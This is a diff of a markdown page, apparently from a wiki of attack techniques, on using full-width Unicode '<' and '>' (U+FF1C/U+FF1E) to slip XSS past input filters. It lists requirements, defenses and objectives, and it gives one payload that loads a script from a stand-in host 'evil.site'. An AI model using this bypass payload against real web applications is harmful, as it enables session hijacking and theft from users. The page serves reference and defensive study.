@@ -33,11 +33,15 @@ From a technical perspective, this technique works by taking advantage of the fa
 
 The business value of this technique is that it allows an attacker to execute arbitrary code in the context of a victim's browser, potentially stealing sensitive information, hijacking user sessions, or delivering malware.
 
+ 
+
 ## Requirements
 
 1. Access to a web application that uses Unicode character encoding for user input
 
 1. Knowledge of the full-width equivalents of the < and > characters
+
+ 
 
 ## Defense
 
@@ -46,6 +50,8 @@ The business value of this technique is that it allows an attacker to execute ar
 1. Use a Content Security Policy (CSP) to restrict the types of content that can be loaded in the web page
 
 1. Regularly update and patch the web application to address known vulnerabilities
+
+ 
 
 ## Objectives
 
@@ -57,11 +63,19 @@ The business value of this technique is that it allows an attacker to execute ar
 
 1. Deliver malware
 
+ 
+
 # Instructions
 
 1. To perform a Unicode Character Injection attack, an attacker can use characters such as U+FF1C and U+FF1E to bypass input validation and inject malicious code into a web application. This can be used to steal sensitive information, perform unauthorized actions, or take control of the affected system.
 
+ 
+
+
+
 **Code**: [[＜script/src=//evil.site/poc.js＞]]
+
+
 
 > The U+FF1C and U+FF1E characters are fullwidth less-than and greater-than signs, respectively. These characters can be used to bypass input validation that only checks for the standard ASCII less-than and greater-than signs. By using these characters, an attacker can inject malicious code into a web application that may be executed by the browser or server. This can be used to perform a variety of attacks, such as cross-site scripting (XSS), SQL injection, or command injection. To prevent Unicode Character Injection attacks, input validation should include checks for these and other non-standard characters that may be used to bypass validation.
 
@@ -81,3 +95,5 @@ The business value of this technique is that it allows an attacker to execute ar
 - [[Bypass "<" and ">" using ＜ and ＞]]
 - [[Cross Site Scripting]]
 - [[Filter Bypass and exotic payloads]]
+
+
